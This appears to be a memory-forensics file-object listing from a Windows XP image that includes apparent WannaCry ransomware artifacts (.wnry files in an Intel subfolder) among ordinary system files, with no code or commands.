0x21f3d00	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x21f3d98	\Documents and Settings\donny\Start Menu\Programs\Accessories\Entertainment\Windows Media Player.lnk	112
0x21f4f90	\Documents and Settings\donny\Start Menu	112
0x220ea70	\System Volume Information\tracking.log	112
0x220ec40	\Intel\ivecuqmanpnirkt615\msg\m_turkish.wnry	112
0x220feb8	\WINDOWS\system32\MSCTF.dll	112
0x2210278	\WINDOWS\system32\config\software.LOG	112
0x22109d0	\WINDOWS\AppPatch	112
0x2210df0	\$Directory	112
0x2211028	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Communications\Network Connections.lnk	112
0x22118f8	\WINDOWS\system32\msnsspc.dll	112
0x2211d20	\WINDOWS\system32\winipsec.dll	112
0x2211f90	\Documents and Settings\All Users\Start Menu\Programs\Accessories\System Tools\System Restore.lnk	112
0x2212028	\Intel\ivecuqmanpnirkt615\msg\m_russian.wnry	112
0x2212668	\WINDOWS\system32\oakley.dll	112
0x2212a90	\WINDOWS\system32\ipsecsvc.dll	112
0x2212eb8	\WINDOWS\system32\srvsvc.dll	112
0x22133b8	\WINDOWS\system32\dhcpcsvc.dll	112
0x2213c28	\WINDOWS\system32\digest.dll	112
0x22148f8	\WINDOWS\system32\credssp.dll	112
0x22159a0	\WINDOWS\WinSxS\Policies\x86_policy.1.0.Microsoft.Windows.GdiPlus_6595b64144ccf1df_x-ww_4e8510ac\1.0.6002.23084.Policy	112
0x2215c28	\WINDOWS\system32\netlogon.dll	112
0x2216028	\Documents and Settings\All Users\Start Menu\Programs\Accessories\System Tools\desktop.ini	112
0x2216510	\WINDOWS\system32\pstorsvc.dll	112
0x22168f8	\WINDOWS\system32\wdigest.dll	112
0x2216f28	\WINDOWS\system32\msxml3r.dll	112
0x2217200	\WINDOWS\system32\wbem	112
0x2217528	\Intel\ivecuqmanpnirkt615\msg\m_spanish.wnry	112
0x2217668	\WINDOWS\system32\netmsg.dll	112
0x2217a90	\WINDOWS\system32\iphlpapi.dll	112
0x2217cd0	\WINDOWS\system32\rasmans.dll	112
0x2217f90	\WINDOWS\pchealth\helpctr\binaries\pchsvc.dll	112
0x2218320	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Entertainment\Volume Control.lnk	112
0x22184b0	\WINDOWS\system32\netman.dll	112
0x2218800	\WINDOWS\system32\winspool.drv	112
0x2218c28	\WINDOWS\system32\schannel.dll	112
0x22193f0	\$Directory	112
0x22195a8	\WINDOWS\system32\dmserver.dll	112
0x22199d0	\WINDOWS\system32\certcli.dll	112
0x2219b30	\Intel\ivecuqmanpnirkt615\msg\m_slovak.wnry	112
0x2219df8	\WINDOWS\system32\themeui.dll	112
0x221aa90	\WINDOWS\system32\msapsspc.dll	112
0x221aeb8	\WINDOWS\system32\lmhsvc.dll	112
0x221b3d8	\WINDOWS\system32\uxtheme.dll	112
0x221b800	\WINDOWS\system32\msacm32.dll	112
0x221bc28	\WINDOWS\system32\winmm.dll	112
0x221ceb8	\WINDOWS\system32\msvcrt40.dll	112
0x221d3d8	\WINDOWS\system32\w32time.dll	112
0x221dad8	\Documents and Settings\All Users\Start Menu\Programs\Games\Freecell.lnk	112
0x221dd00	\WINDOWS\system32\es.dll	112
0x221e4b0	\WINDOWS\system32\scesrv.dll	112
0x221ed20	\WINDOWS\system32\kerberos.dll	112
0x221f668	\WINDOWS\AppPatch\AcGenral.dll	112
0x221fb90	\Documents and Settings\All Users\Start Menu\Programs\Games\Internet Hearts.lnk	112
0x221fd20	\WINDOWS\system32\dnsrslvr.dll	112
0x2220668	\WINDOWS\system32\shgina.dll	112
0x2220a90	\WINDOWS\system32\comres.dll	112
0x2220e98	\WINDOWS\system32\umpnpmgr.dll	112
0x22213d8	\WINDOWS\system32\cryptdll.dll	112
0x2221800	\WINDOWS\system32\samsrv.dll	112
0x2221c28	\WINDOWS\system32\samlib.dll	112
0x2222028	\WINDOWS\ime\imkr6_1\dicts	112
0x22239d0	\WINDOWS\system32\rasapi32.dll	112
0x2223df8	\WINDOWS\system32\adsldpc.dll	112
0x22243b8	\WINDOWS\system32\activeds.dll	112
0x2225128	\WINDOWS\system32\crypt32.dll	112
0x22259d0	\WINDOWS\system32\mprapi.dll	112
0x2225df8	\WINDOWS\system32\cryptui.dll	112
0x2226740	\WINDOWS\system32\rastls.dll	112
0x2226ab0	\WINDOWS\system32\drivers\fips.sys	112
0x2226eb8	\WINDOWS\system32\userinit.exe	112
0x2227128	\WINDOWS\system32\msasn1.dll	112
0x2227d20	\WINDOWS\system32\powrprof.dll	112
0x2228668	\WINDOWS\system32\cscui.dll	112
0x2228eb8	\WINDOWS\system32\atl.dll	112
0x2229158	\WINDOWS\system	112
0x2229320	\WINDOWS\system32\ctfmon.exe	112
0x22293d8	\WINDOWS\system32\logonui.exe	112
0x2229748	\Intel\ivecuqmanpnirkt615\msg\m_vietnamese.wnry	112
0x22298d8	\WINDOWS\system32\eappcfg.dll	112
0x2229c28	\WINDOWS\system32\tspkg.dll	112
0x222a028	\Endpoint	112
0x222a4d0	\WINDOWS\system32\mswsock.dll	112
0x222a8f8	\WINDOWS\system32\rtutils.dll	112
0x222ad20	\WINDOWS\system32\wlnotify.dll	112
0x222b220	\WINDOWS\system32\dimsntfy.dll	112
0x222b648	\WINDOWS\system32\cscdll.dll	112
0x222ba90	\WINDOWS\system32\oleacc.dll	112
0x222bc68	\WINDOWS\system32\ega.cpi	112
0x222beb8	\WINDOWS\system32\msimg32.dll	112
0x222c320	\Documents and Settings\All Users\Start Menu\Programs\Accessories\System Tools\Backup.lnk	112
0x222c3d8	\WINDOWS\system32\rasadhlp.dll	112
0x222c800	\WINDOWS\system32\winrnr.dll	112
0x222d028	\WINDOWS\system32\muweb.dll	112
0x222d4b0	\WINDOWS\system32\clbcatq.dll	112
0x222d8f8	\WINDOWS\system32\wzcsvc.dll	112
0x222dd20	\WINDOWS\system32\eventlog.dll	112
0x222e340	\WINDOWS\system32\dbghelp.dll	112
0x222e800	\WINDOWS\system32\dnsapi.dll	112
0x222ec08	\WINDOWS\system32\wshtcpip.dll	112
0x222f028	\Documents and Settings\All Users\Start Menu\Programs\Games\desktop.ini	112
0x222f4b0	\WINDOWS\system32\dot3api.dll	112
0x222f8d8	\WINDOWS\system32\hnetcfg.dll	112
0x222fc10	\Documents and Settings\LocalService\Local Settings\History\History.IE5\index.dat	112
0x2230668	\WINDOWS\system32\wmi.dll	112
0x2230ab0	\WINDOWS\system32\eapolqec.dll	112
0x2230eb8	\WINDOWS\system32\qutil.dll	112
0x2231158	\WINDOWS\msagent	112
0x22313d8	\WINDOWS\system32\esent.dll	112
0x22316b0	\System Volume Information\_restore{915C6505-6DED-4903-B727-F8B5C05262FF}\drivetable.txt	112
0x2231800	\WINDOWS\system32\xpsp2res.dll	112
0x2231c28	\WINDOWS\system32\rpcss.dll	112
0x2232418	\Intel\ivecuqmanpnirkt615\msg\m_swedish.wnry	112
0x22324d0	\WINDOWS\system32\ntmarta.dll	112
0x22328f8	\WINDOWS\system32\svchost.exe	112
0x2232d20	\WINDOWS\system32\scecli.dll	112
0x2232f28	\Documents and Settings\All Users\Start Menu\Programs\Administrative Tools\Computer Management.lnk	112
0x2233240	\WINDOWS\system32\wtsapi32.dll	112
0x2233518	\WINDOWS\system32\wbem\Repository\$WinMgmt.CFG	112
0x2233668	\WINDOWS\system32\winscard.dll	112
0x2233d20	\WINDOWS\system32\ntdsapi.dll	112
0x2233f18	\Intel\ivecuqmanpnirkt615	112
0x2234028	\WINDOWS\system32\drprov.dll	112
0x22345c0	\WINDOWS\system32\attrib.exe	112
0x2234688	\Documents and Settings\All Users\Start Menu\Programs\Games\Spider Solitaire.lnk	112
0x2234808	\WINDOWS\system32\rundll32.exe	112
0x2234b68	\WINDOWS\system32\cryptsvc.dll	112
0x2234f90	\WINDOWS\system32\webclnt.dll	112
0x22354b0	\WINDOWS\system32\midimap.dll	112
0x22358d8	\WINDOWS\system32\msacm32.drv	112
0x2235e00	\Documents and Settings\donny\Local Settings\Temp\24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c.bin	112
0x2235f90	\WINDOWS\system32\wdmaud.drv	112
0x2236320	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Internet Browser Choice.lnk	112
0x22364b0	\WINDOWS\system32\wkssvc.dll	112
0x22368d8	\WINDOWS\system32\audiosrv.dll	112
0x2236d78	\WINDOWS\Prefetch\TASKSE.EXE-02A1B304.pf	112
0x2236f90	\WINDOWS\system32\spoolsv.exe	112
0x2237158	\WINDOWS\msagent\intl	112
0x2237320	\WINDOWS\system32\shell32.dll	112
0x22374b0	\WINDOWS\system32\msidle.dll	112
0x22378d8	\WINDOWS\system32\schedsvc.dll	112
0x2238028	\Documents and Settings\donny\NetHood	112
0x2238758	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x22389d0	\WINDOWS\system32\wbem\wmisvc.dll	112
0x2238df8	\$Directory	112
0x2238ef8	\Documents and Settings\All Users\Start Menu\Programs\Accessories\WordPad.lnk	112
0x2238f90	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Remote Desktop Connection.lnk	112
0x2239028	\WINDOWS\system32\ulib.dll	112
0x2239668	\WINDOWS\system32\msv1_0.dll	112
0x2239f90	\WINDOWS\system32\desk.cpl	112
0x223a320	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x223a4b0	\WINDOWS\system32\shdocvw.dll	112
0x223a8d8	\WINDOWS\system32\wzcsapi.dll	112
0x223ab70	\WINDOWS\system32\rasmans.dll	112
0x223ad00	\WINDOWS\system32\eappprxy.dll	112
0x223b028	\System Volume Information\_restore{915C6505-6DED-4903-B727-F8B5C05262FF}\RP3\rp.log	112
0x223b320	\Documents and Settings\donny\Start Menu\Programs\Accessories\System Tools\Internet Explorer (No Add-ons).lnk	112
0x223b4d0	\WINDOWS\system32\dpcdll.dll	112
0x223b9d0	\WINDOWS\system32\vssapi.dll	112
0x223bad0	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x223bdf8	\WINDOWS\system32\netshell.dll	112
0x223c478	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Communications\Network Setup Wizard.lnk	112
0x223c518	\WINDOWS\system32\comres.dll	112
0x223c5b0	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x223c740	\WINDOWS\system32\tapi32.dll	112
0x223c8a0	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Communications\HyperTerminal.lnk	112
0x223cb68	\WINDOWS\system32\rasman.dll	112
0x223cf90	\WINDOWS\system32\termsrv.dll	112
0x223d8d8	\WINDOWS\system32\wbem\ncprov.dll	112
0x223dd00	\WINDOWS\system32\wuapi.dll	112
0x223e028	\Documents and Settings\donny\Start Menu\Programs\Accessories\Accessibility\On-Screen Keyboard.lnk	112
0x223e3e8	\$Directory	112
0x223e5a8	\WINDOWS\system32\onex.dll	112
0x223e9d0	\WINDOWS\system32\dot3dlg.dll	112
0x223edf8	\WINDOWS\system32\credui.dll	112
0x223fb68	\WINDOWS\explorer.exe	112
0x223ff90	\WINDOWS\system32\raschap.dll	112
0x22404b0	\WINDOWS\system32\riched20.dll	112
0x2240800	\WINDOWS\system32\dssenh.dll	112
0x2240c08	\WINDOWS\system32\wuauclt.exe	112
0x2240f90	\$Directory	112
0x22415a8	\WINDOWS\system32\browseui.dll	112
0x2241708	\DAV RPC SERVICE	112
0x2241d00	\WINDOWS\system32\wbem\wbemprox.dll	112
0x2242240	\WINDOWS\system32\msi.dll	112
0x2242478	\Documents and Settings\donny\Start Menu\Programs\Accessories\Windows Explorer.lnk	112
0x2242648	\WINDOWS\system32\colbact.dll	112
0x22428a0	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Paint.lnk	112
0x2242a90	\WINDOWS\system32\comsvcs.dll	112
0x2242c10	\Documents and Settings\All Users\Start Menu\Programs\7-Zip\7-Zip Help.lnk	112
0x2242d40	\Documents and Settings\All Users\Start Menu\Programs\Accessories\System Tools\Disk Defragmenter.lnk	112
0x2242dd8	\Documents and Settings\donny\Start Menu\desktop.ini	112
0x2242eb8	\WINDOWS\system32\wbem\wbemcons.dll	112
0x2243320	\WINDOWS\system32\sysmon.ocx	112
0x22434b0	\WINDOWS\system32\msutb.dll	112
0x2243d00	\WINDOWS\system32\actxprxy.dll	112
0x2244648	\WINDOWS\system32\icaapi.dll	112
0x2244a70	\WINDOWS\system32\mstlsapi.dll	112
0x2244bd8	\Endpoint	112
0x22453d8	\WINDOWS\system32\tcpmon.dll	112
0x22456e0	\Intel\ivecuqmanpnirkt615	112
0x2245800	\WINDOWS\system32\wbem\repdrvfs.dll	112
0x2245d00	\$Directory	112
0x2246028	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Entertainment\Sound Recorder.lnk	112
0x22464b0	\WINDOWS\system32\wbem\wmiutils.dll	112
0x22468f8	\WINDOWS\system32\wbem\wbemsvc.dll	112
0x2246a88	\Documents and Settings\All Users\Start Menu\Set Program Access and Defaults.lnk	112
0x2246c68	\$Directory	112
0x2246d20	\WINDOWS\system32\winhttp.dll	112
0x2246f90	\trkwks	112
0x22473f0	\Documents and Settings\donny\Start Menu\Programs\Windows Media Player.lnk	112
0x2247488	\WINDOWS\system32	112
0x22475c0	\Program Files\Internet Explorer\IEXPLORE.EXE	112
0x2247840	\WINDOWS\system32\sndvol32.exe	112
0x2247a90	\WINDOWS\system32\wuaueng.dll	112
0x2247ca0	\Documents and Settings\All Users\Start Menu\Programs\Games\Internet Backgammon.lnk	112
0x2247e70	\WINDOWS\system32\wbem\Repository\FS\INDEX.MAP	112
0x2247f08	\WINDOWS\system32\wbem\Repository\FS\MAPPING.VER	112
0x2248028	\WINDOWS\Media\Windows XP Startup.wav	112
0x2248b08	\WINDOWS\system32\wbem\Repository\FS\MAPPING2.MAP	112
0x2248ef8	\W32TIME	112
0x2248f90	\W32TIME	112
0x22490c0	\WINDOWS\system32\mshearts.exe	112
0x2249a90	\WINDOWS\system32\wuauserv.dll	112
0x2249eb8	\WINDOWS\system32\wbem\fastprox.dll	112
0x224a938	\WINDOWS\system32\c_1250.nls	112
0x224b4d0	\WINDOWS\system32\cnbjmon.dll	112
0x224b8f8	\WINDOWS\system32\spoolss.dll	112
0x224bd00	\WINDOWS\system32\ssdpapi.dll	112
0x224c028	\Documents and Settings\All Users\Start Menu\Programs\Python 2.7\Python (command line).lnk	112
0x224c740	\WINDOWS\system32\browser.dll	112
0x224ce98	\WINDOWS\system32\wups2.dll	112
0x224d320	\WINDOWS\system32\wsecedit.dll	112
0x224d3d8	\WINDOWS\system32\wups.dll	112
0x224d800	\WINDOWS\system32\wbem\wbemess.dll	112
0x224db70	\PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER	112
0x224dc28	\WINDOWS\system32\wbem\wmiprvsd.dll	112
0x224e4d0	\WINDOWS\system32\mspatcha.dll	112
0x224e708	\$Directory	112
0x224e8f8	\WINDOWS\system32\cabinet.dll	112
0x224ea80	\Documents and Settings\All Users\Start Menu\Programs\Games\Hearts.lnk	112
0x224eb18	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x224ed40	\WINDOWS\ime\SPTIP.dll	112
0x224f240	\WINDOWS\system32\sens.dll	112
0x224f418	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Calculator.lnk	112
0x224f668	\WINDOWS\system32\trkwks.dll	112
0x224fa90	\WINDOWS\system32\srsvc.dll	112
0x224fca8	\WINDOWS\system32\tapisrv.dll	112
0x224fd68	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x224fe00	\WINDOWS\system32\ntlanman.dll	112
0x224feb8	\WINDOWS\system32\seclogon.dll	112
0x22503d8	\WINDOWS\system32\psbase.dll	112
0x22505b0	\WINDOWS\system32\cleanmgr.exe	112
0x2250820	\WINDOWS\system32\wscntfy.exe	112
0x2250c28	\WINDOWS\system32\ctfmon.exe	112
0x22512c0	\Documents and Settings\All Users\Start Menu\Programs\Accessories\System Tools\Scheduled Tasks.lnk	112
0x2251840	\Documents and Settings\donny	112
0x22518d8	\WINDOWS\system32\upnp.dll	112
0x2251d40	\WINDOWS\system32\alg.exe	112
0x2251f28	\WINDOWS\system32\winmine.exe	112
0x22524d0	\WINDOWS\system32\verclsid.exe	112
0x22528f8	\WINDOWS\system32\resutils.dll	112
0x2252d20	\WINDOWS\system32\clusapi.dll	112
0x2253240	\WINDOWS\system32\wbem\wbemcomn.dll	112
0x22535b0	\WINDOWS\system32\msxml3.dll	112
0x2253668	\WINDOWS\system32\wbem\esscli.dll	112
0x2254028	\WINDOWS\WindowsUpdate.log	112
0x22552f0	\WINDOWS\system32\wbem\Repository\FS\MAPPING1.MAP	112
0x2255a60	\Documents and Settings\All Users\Start Menu	112
0x22562d8	\Program Files\MSN Gaming Zone\Windows\Rvsezm.exe	112
0x2256700	\Documents and Settings\All Users\Start Menu\Programs\Python 2.7\IDLE (Python GUI).lnk	112
0x2256c88	\Intel\ivecuqmanpnirkt615\t.wnry	112
0x2257b30	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x2257f90	\net\NtControlPipe8	112
0x22586a0	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x2258930	\WINDOWS\system32\ersvc.dll	112
0x2258a68	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Entertainment\desktop.ini	112
0x2258b88	\WINDOWS\system32\wscsvc.dll	112
0x2258eb8	\WINDOWS\system32\regsvc.dll	112
0x2259408	\Program Files\MSN Gaming Zone\Windows\chkrzm.exe	112
0x2259600	\WINDOWS\system32\ipnathlp.dll	112
0x2259858	\WINDOWS\system32\localspl.dll	112
0x2259b88	\WINDOWS\system32\ssdpsrv.dll	112
0x2259d60	\Program Files\Windows Media Player\wmplayer.exe	112
0x225a858	\WINDOWS\system32\rsaenh.dll	112
0x225aba8	\WINDOWS\system32\netcfgx.dll	112
0x225b390	\WINDOWS\system32\wsock32.dll	112
0x225b6c0	\WINDOWS\system32\mtxclu.dll	112
0x225b9f0	\WINDOWS\system32\wbem\wbemcore.dll	112
0x225bba0	\Python27\DLLs\py.ico	112
0x225ee10	\Documents and Settings\donny\NTUSER.DAT	112
0x225ef90	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x225f548	\WINDOWS\system32\wpa.dbl	112
0x225fb50	\WINDOWS\system32\cfgmgr32.dll	112
0x2262900	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x2264808	\Program Files\NetMeeting	112
0x22648a0	\WINDOWS\pchealth\helpctr\binaries	112
0x2265a40	\WINDOWS\system32\batmeter.dll	112
0x2277d10	\WINDOWS\system32\hid.dll	112
0x22783f0	\WINDOWS\system.ini	112
0x227b780	\WINDOWS\system32\wucltui.dll	112
0x227e338	\WINDOWS\system32\pjlmon.dll	112
0x227f950	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Accessibility\desktop.ini	112
0x227fb28	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x2280478	\Documents and Settings\All Users\Start Menu\Programs\Administrative Tools\Services.lnk	112
0x2280810	\WINDOWS\system32\moricons.dll	112
0x2280b60	\Documents and Settings\donny\Start Menu\Programs\Accessories\Accessibility\Utility Manager.lnk	112
0x2282728	\Documents and Settings\NetworkService\Local Settings\desktop.ini	112
0x2282ae8	\WINDOWS\system32\rasdlg.dll	112
0x2282f90	\net\NtControlPipe11	112
0x2284448	\net\NtControlPipe0	112
0x2285518	\net\NtControlPipe1	112
0x2285eb8	\WINDOWS\system32\msprivs.dll	112
0x22862a0	\WINDOWS\system32\webcheck.dll	112
0x2286460	\WINDOWS\system32\usbmon.dll	112
0x2286cc0	\WINDOWS\system32\inetpp.dll	112
0x2288980	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x228af90	\WINDOWS\system32\vga.dll	112
0x228f988	\WINDOWS\system32\authz.dll	112
0x228faf0	\WINDOWS\system32\winlogon.exe	112
0x228fbe0	\WINDOWS\system32\vga64k.dll	112
0x228fcd8	\WINDOWS\system32\vga256.dll	112
0x228fde8	\$Directory	112
0x2291f38	\WINDOWS\system32\framebuf.dll	112
0x2292c40	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x229a308	\WINDOWS\system32	112
0x229ba88	\WINDOWS\system32\nddeapi.dll	112
0x229e338	\$Directory	112
0x229ec48	\WINDOWS\system32\winsta.dll	112
0x229ed70	\WINDOWS\system32\setupapi.dll	112
0x229f028	\WINDOWS\system32\sfc.dll	112
0x229f198	\WINDOWS\system32\regapi.dll	112
0x229f270	\WINDOWS\system32\psapi.dll	112
0x229fa60	\WINDOWS\system32\netapi32.dll	112
0x229ff90	\WINDOWS\system32\profmap.dll	112
0x22a0f90	\WINDOWS\system32\msgina.dll	112
0x22a1028	\WINDOWS\system32\lsass.exe	112
0x22a1110	\WINDOWS\system32\MSCTFIME.IME	112
0x22a1238	\Winsock2\CatalogChangeListener-388-0	112
0x22a1620	\WINDOWS\system32\kbdus.dll	112
0x22a1740	\WINDOWS\system32\imm32.dll	112
0x22a1850	\WINDOWS\system32\ws2help.dll	112
0x22a32e8	\WINDOWS\system32\ws2_32.dll	112
0x22a3830	\WINDOWS\system32\wintrust.dll	112
0x22a4110	\WINDOWS\system32\services.exe	112
0x22a50e0	\$Directory	112
0x22a6d20	\Documents and Settings\All Users\Start Menu\Programs\Python 2.7\Module Docs.lnk	112
0x22a6f28	\Documents and Settings\donny\Start Menu\Programs\Accessories\Synchronize.lnk	112
0x22a7148	\WINDOWS\system32\notepad.exe	112
0x22a7340	\WINDOWS\system32\linkinfo.dll	112
0x22a7568	\WINDOWS\Fonts\framd.ttf	112
0x22a7b98	\WINDOWS\system32\rasdlg.dll	112
0x22a7e60	\WINDOWS\system32\inetpp.dll	112
0x22a8088	\WINDOWS\system32\netrap.dll	112
0x22a82a8	\WINDOWS\system32\win32spl.dll	112
0x22a84d8	\WINDOWS\system32\batmeter.dll	112
0x22a86f8	\WINDOWS\system32\stobject.dll	112
0x22a8960	\WINDOWS\system32\mlang.dll	112
0x22a8bb8	\WINDOWS\system32\webcheck.dll	112
0x22a8f28	\WINDOWS\Media\Windows XP Balloon.wav	112
0x22a9150	\WINDOWS\system32\usbmon.dll	112
0x22a9368	\WINDOWS\system32\tcpmon.dll	112
0x22a9590	\WINDOWS\system32\pjlmon.dll	112
0x22a9760	\WINDOWS\system32\cnbjmon.dll	112
0x22a9930	\WINDOWS\system32\localspl.dll	112
0x22a9be8	\WINDOWS\system32\spoolss.dll	112
0x22a9e48	\WINDOWS\system32\ssdpsrv.dll	112
0x22aa350	\WINDOWS\system32\drivers\disdn	112
0x22aa4e0	\WINDOWS\system32\ssdpapi.dll	112
0x22aa728	\WINDOWS\system32\tapisrv.dll	112
0x22aab28	\$Directory	112
0x22aabc0	\WINDOWS\ime\SPTIP.dll	112
0x22aaeb0	\WINDOWS\system32\wscntfy.exe	112
0x22ab1e8	\Documents and Settings\All Users\Start Menu\Programs\Startup\desktop.ini	112
0x22ab418	\Documents and Settings\All Users\Start Menu\Programs\Accessories\System Tools\Security Center.lnk	112
0x22ab610	\Documents and Settings\All Users\Start Menu\Programs\Accessories\System Tools\Disk Cleanup.lnk	112
0x22abb70	\$Directory	112
0x22abe00	\WINDOWS\SoftwareDistribution\ReportingEvents.log	112
0x22ac060	\$Directory	112
0x22ac0f8	\WINDOWS\system32\en-US\ieframe.dll.mui	112
0x22ac450	\$Directory	112
0x22ac4e8	\Documents and Settings\All Users\Start Menu\Programs\Python 2.7\Uninstall Python.lnk	112
0x22ac6e0	\Documents and Settings\All Users\Documents\desktop.ini	112
0x22ac8d8	\WINDOWS\system32\netcfgx.dll	112
0x22acb00	\$Directory	112
0x22acc68	\WINDOWS\system32\alg.exe	112
0x22aceb8	\WINDOWS\system32\verclsid.exe	112
0x22ad258	\$Directory	112
0x22ad2f0	\WINDOWS\system32\calc.exe	112
0x22ad620	\$Directory	112
0x22ad6b8	\WINDOWS\system32\ntbackup.exe	112
0x22ad9e8	\$Directory	112
0x22ada80	\WINDOWS\system32\sndrec32.exe	112
0x22adc78	\Documents and Settings\donny\Recent\Desktop.ini	112
0x22ae028	\Documents and Settings\All Users\Start Menu\Programs\Administrative Tools\Performance.lnk	112
0x22ae218	\$Directory	112
0x22ae2b0	\WINDOWS\system32\shimgvw.dll	112
0x22ae5e0	\$Directory	112
0x22aea68	\Program Files\Outlook Express\wab.exe	112
0x22aed98	\$Directory	112
0x22aee30	\WINDOWS\WinSxS\x86_Microsoft.Windows.GdiPlus_6595b64144ccf1df_1.0.6002.23084_x-ww_f3f35550	112
0x22af208	\Documents and Settings\donny\My Documents\My Music\Desktop.ini	112
0x22af400	\WINDOWS\system32\compatUI.dll	112
0x22af5f8	\WINDOWS\system32\ntshrui.dll	112
0x22af978	\$Directory	112
0x22afa10	\WINDOWS\system32\utilman.exe	112
0x22afbe0	\WINDOWS\system32\taskkill.exe	112
0x22afdd8	\Documents and Settings\All Users\Start Menu\Programs\Windows Movie Maker.lnk	112
0x22aff90	\Documents and Settings\donny\Start Menu\Programs\Internet Explorer.lnk	112
0x22b02b0	\WINDOWS\system32\resutils.dll	112
0x22b04d8	\WINDOWS\system32\clusapi.dll	112
0x22b0700	\WINDOWS\system32\wsock32.dll	112
0x22b0920	\WINDOWS\system32\mtxclu.dll	112
0x22b0b50	\WINDOWS\system32\colbact.dll	112
0x22b0d78	\WINDOWS\system32\comsvcs.dll	112
0x22b1148	\$Directory	112
0x22b11e0	\WINDOWS\system32\ntlsapi.dll	112
0x22b1520	\WINDOWS\system32\lz32.dll	112
0x22b15b8	\WINDOWS\system32\wbem\wbemcons.dll	112
0x22b17b8	\WINDOWS\system32\msutb.dll	112
0x22b1af8	\WINDOWS\system32\actxprxy.dll	112
0x22b1cc8	\WINDOWS\system32\mstlsapi.dll	112
0x22b1e98	\WINDOWS\system32\icaapi.dll	112
0x22b2028	\WINDOWS\system32\wuauclt.exe	112
0x22b20e8	\WINDOWS\system32\termsrv.dll	112
0x22b2448	\WINDOWS\system32\wbem\ncprov.dll	112
0x22b2698	\WINDOWS\system32\wuapi.dll	112
0x22b2a18	\WINDOWS\system32\browser.dll	112
0x22b2c80	\WINDOWS\system32\dssenh.dll	112
0x22b3508	\WINDOWS\system32\wups2.dll	112
0x22b3750	\WINDOWS\system32\wups.dll	112
0x22b3b78	\WINDOWS\system32\wbem\wbemess.dll	112
0x22b3d00	\WINDOWS\system32\mui\040D	112
0x22b3dc0	\WINDOWS\system32\mui\040C	112
0x22b3f28	\WINDOWS\system32\wbem\wmiprvsd.dll	112
0x22b4810	\WINDOWS\system32\fldrclnr.dll	112
0x22b5028	\WINDOWS\system32\cabinet.dll	112
0x22b52a0	\$Directory	112
0x22b5338	\WINDOWS\system32\wbem\Repository\FS\OBJECTS.DATA	112
0x22b5530	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x22b5728	\WINDOWS\system32\wbem\repdrvfs.dll	112
0x22b5a50	\WINDOWS\system32\wbem\wmiutils.dll	112
0x22b5c20	\WINDOWS\system32\wbem\wbemsvc.dll	112
0x22b5e70	\WINDOWS\system32\mspatcha.dll	112
0x22b6028	\Endpoint	112
0x22b62d8	\WINDOWS\system32\winhttp.dll	112
0x22b65f0	\WINDOWS\system32\wuaueng.dll	112
0x22b6e70	\WINDOWS\system32\wuauserv.dll	112
0x22b7330	\WINDOWS\system32\wbem\fastprox.dll	112
0x22b77f8	\WINDOWS\system32\wbem\esscli.dll	112
0x22b7b38	\WINDOWS\system32\wbem\wbemcore.dll	112
0x22b7f90	\WINDOWS\system32\wbem\wbemcomn.dll	112
0x22b8028	\WINDOWS\system32\seclogon.dll	112
0x22b8280	\WINDOWS\system32\wbem\wbemprox.dll	112
0x22b84a8	\WINDOWS\system32\msi.dll	112
0x22b8740	\WINDOWS\system32\wscsvc.dll	112
0x22b8938	\WINDOWS\system32\trkwks.dll	112
0x22b8b88	\WINDOWS\system32\srsvc.dll	112
0x22b8e40	\WINDOWS\system32\sens.dll	112
0x22b9288	\WINDOWS\system32\regsvc.dll	112
0x22b94b0	\	112
0x22b9960	\WINDOWS\system32\psbase.dll	112
0x22b9b88	\WINDOWS\system32\pstorsvc.dll	112
0x22b9db0	\WINDOWS\system32\netmsg.dll	112
0x22b9f90	\WINDOWS\system32\winipsec.dll	112
0x22ba1f8	\WINDOWS\system32\oakley.dll	112
0x22ba450	\WINDOWS\system32\ipsecsvc.dll	112
0x22ba6a8	\WINDOWS\system32\srvsvc.dll	112
0x22baa88	\$Directory	112
0x22bab20	\WINDOWS\pchealth\helpctr\binaries\pchsvc.dll	112
